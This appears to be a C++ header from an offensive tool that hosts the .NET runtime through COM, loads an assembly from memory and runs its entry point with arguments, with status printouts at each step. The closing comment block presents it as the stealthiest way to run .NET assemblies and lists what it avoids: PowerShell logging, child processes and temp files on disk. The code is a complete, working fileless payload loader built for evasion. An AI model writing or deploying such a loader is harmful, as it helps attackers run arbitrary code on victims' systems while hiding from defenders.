#pragma once

#include <Windows.h>
#include <metahost.h>
#include <mscoree.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "mscoree.lib")

#include "CLR_COM_Interfaces.h"

using namespace std;

// ========================================
// Full CLR Hosting with Manual COM Interop
// No PowerShell! No mscorlib.tlb!
// Pure in-memory execution!
// ========================================

BOOL ExecuteDotNetAssemblyManual(const vector<unsigned char>& assemblyBytes, int argc, char* argv[]) {
    printf("[*] Initializing CLR (Manual COM Interop - No PowerShell!)...\n");

    HRESULT hr;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pCorRuntimeHost = NULL;

    // ========================================
    // Step 1: Initialize CLR
    // ========================================

    hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) {
        printf("[-] CLRCreateInstance failed: 0x%x\n", hr);
        return FALSE;
    }
    printf("[+] CLR MetaHost created\n");

    // Get runtime info for .NET 4.0
    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) {
        printf("[-] GetRuntime failed: 0x%x\n", hr);
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] CLR Runtime Info obtained\n");

    // Get ICorRuntimeHost (this is the key!)
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pCorRuntimeHost);
    if (FAILED(hr)) {
        printf("[-] GetInterface(ICorRuntimeHost) failed: 0x%x\n", hr);
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] ICorRuntimeHost obtained\n");

    // Start CLR
    hr = pCorRuntimeHost->Start();
    if (FAILED(hr)) {
        printf("[-] Start failed: 0x%x\n", hr);
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] CLR started successfully!\n");

    // ========================================
    // Step 2: Get Default AppDomain
    // ========================================

    IUnknown* pAppDomainUnk = NULL;
    hr = pCorRuntimeHost->GetDefaultDomain(&pAppDomainUnk);
    if (FAILED(hr)) {
        printf("[-] GetDefaultDomain failed: 0x%x\n", hr);
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] Default AppDomain obtained\n");

    // Query for _AppDomain interface
    _AppDomain* pAppDomain = NULL;
    hr = pAppDomainUnk->QueryInterface(IID_AppDomain, (VOID**)&pAppDomain);
    pAppDomainUnk->Release();

    if (FAILED(hr)) {
        printf("[-] QueryInterface(_AppDomain) failed: 0x%x\n", hr);
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] _AppDomain interface obtained\n");

    // ========================================
    // Step 3: Load Assembly from Memory
    // ========================================

    printf("[*] Loading .NET assembly (%zu bytes) into memory...\n", assemblyBytes.size());

    // Create SAFEARRAY for assembly bytes
    SAFEARRAY* pSafeArray = SafeArrayCreateVector(VT_UI1, 0, static_cast<ULONG>(assemblyBytes.size()));
    if (!pSafeArray) {
        printf("[-] SafeArrayCreateVector failed\n");
        pAppDomain->Release();
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }

    // Copy assembly bytes to SAFEARRAY
    void* pData = NULL;
    hr = SafeArrayAccessData(pSafeArray, &pData);
    if (SUCCEEDED(hr)) {
        memcpy(pData, assemblyBytes.data(), assemblyBytes.size());
        SafeArrayUnaccessData(pSafeArray);
    }
    else {
        printf("[-] SafeArrayAccessData failed: 0x%x\n", hr);
        SafeArrayDestroy(pSafeArray);
        pAppDomain->Release();
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }

    // Load assembly using Load_3 (loads from byte array)
    _Assembly* pAssembly = NULL;
    hr = pAppDomain->Load_3(pSafeArray, &pAssembly);
    SafeArrayDestroy(pSafeArray);

    if (FAILED(hr)) {
        printf("[-] Load_3 failed: 0x%x\n", hr);
        pAppDomain->Release();
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] Assembly loaded successfully!\n");

    // ========================================
    // Step 4: Get Entry Point
    // ========================================

    _MethodInfo* pMethodInfo = NULL;
    hr = pAssembly->get_EntryPoint(&pMethodInfo);

    if (FAILED(hr) || !pMethodInfo) {
        printf("[-] get_EntryPoint failed: 0x%x\n", hr);
        pAssembly->Release();
        pAppDomain->Release();
        pCorRuntimeHost->Stop();
        pCorRuntimeHost->Release();
        pRuntimeInfo->Release();
        pMetaHost->Release();
        return FALSE;
    }
    printf("[+] Entry point obtained\n");

    // ========================================
    // Step 5: Prepare Arguments
    // ========================================

    SAFEARRAY* pArgs = NULL;

    if (argc > 0) {
        printf("[*] Preparing %d arguments...\n", argc);

        // Create string array for arguments
        pArgs = SafeArrayCreateVector(VT_BSTR, 0, argc);

        for (int i = 0; i < argc; i++) {
            // Convert char* to BSTR
            int len = MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, NULL, 0);
            wchar_t* warg = new wchar_t[len];
            MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, warg, len);

            BSTR bstr = SysAllocString(warg);
            long index = i;
            SafeArrayPutElement(pArgs, &index, bstr);

            printf("[+] Argument %d: %s\n", i, argv[i]);

            SysFreeString(bstr);
            delete[] warg;
        }
    }
    else {
        printf("[*] No arguments provided\n");
        // Create empty array
        pArgs = SafeArrayCreateVector(VT_BSTR, 0, 0);
    }

    // ========================================
    // Step 6: Invoke Entry Point
    // ========================================

    printf("[*] Invoking entry point...\n\n");

    // Prepare VARIANT for arguments
    VARIANT vtArgs;
    VariantInit(&vtArgs);
    vtArgs.vt = VT_ARRAY | VT_BSTR;
    vtArgs.parray = pArgs;

    // Wrap in SAFEARRAY for Invoke_3
    SAFEARRAY* pInvokeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    long index = 0;
    SafeArrayPutElement(pInvokeArgs, &index, &vtArgs);

    // Invoke!
    VARIANT vtResult;
    VariantInit(&vtResult);
    VARIANT vtEmpty;
    VariantInit(&vtEmpty);
    vtEmpty.vt = VT_EMPTY;

    hr = pMethodInfo->Invoke_3(vtEmpty, pInvokeArgs, &vtResult);

    printf("\n");

    if (SUCCEEDED(hr)) {
        printf("[+] Assembly executed successfully!\n");

        // Get return value if available
        if (vtResult.vt == VT_I4) {
            printf("[+] Exit code: %d\n", vtResult.intVal);
        }
        else if (vtResult.vt == VT_EMPTY) {
            printf("[+] Exit code: 0 (void return)\n");
        }
    }
    else {
        printf("[-] Invoke_3 failed: 0x%x\n", hr);

        // Try to get exception info
        if (hr == 0x80131604) {
            printf("[!] Target invocation exception - check if assembly threw an exception\n");
        }
        else if (hr == 0x80131513) {
            printf("[!] Type load exception - check if all dependencies are available\n");
        }
    }

    // ========================================
    // Step 7: Cleanup
    // ========================================

    VariantClear(&vtResult);
    VariantClear(&vtArgs);

    if (pInvokeArgs) SafeArrayDestroy(pInvokeArgs);
    if (pArgs) SafeArrayDestroy(pArgs);

    pMethodInfo->Release();
    pAssembly->Release();
    pAppDomain->Release();
    pCorRuntimeHost->Stop();
    pCorRuntimeHost->Release();
    pRuntimeInfo->Release();
    pMetaHost->Release();

    printf("[+] CLR hosting completed\n");

    return TRUE;
}

// ========================================
// Wrapper Function (for backward compatibility)
// ========================================

BOOL ExecuteDotNetAssembly(const vector<unsigned char>& assemblyBytes, int argc, char* argv[]) {
    return ExecuteDotNetAssemblyManual(assemblyBytes, argc, argv);
}

// ========================================
// Summary
// ========================================

/*
 * This is PURE in-memory .NET assembly execution with:
 *
 * ✅ NO PowerShell
 * ✅ NO mscorlib.tlb
 * ✅ NO temp files
 * ✅ Manual COM interop
 * ✅ Full argument passing
 * ✅ Direct AppDomain.Load_3()
 * ✅ Direct MethodInfo.Invoke_3()
 *
 * This is the most stealthy way to execute .NET assemblies!
 *
 * Detection surface:
 * - CLR initialization (unavoidable)
 * - Network traffic (if assembly makes network calls)
 * - Behavioral analysis (if assembly does suspicious things)
 *
 * But NO:
 * - PowerShell logging
 * - PowerShell child process
 * - Temp files on disk
 * - mscorlib.tlb dependency
 */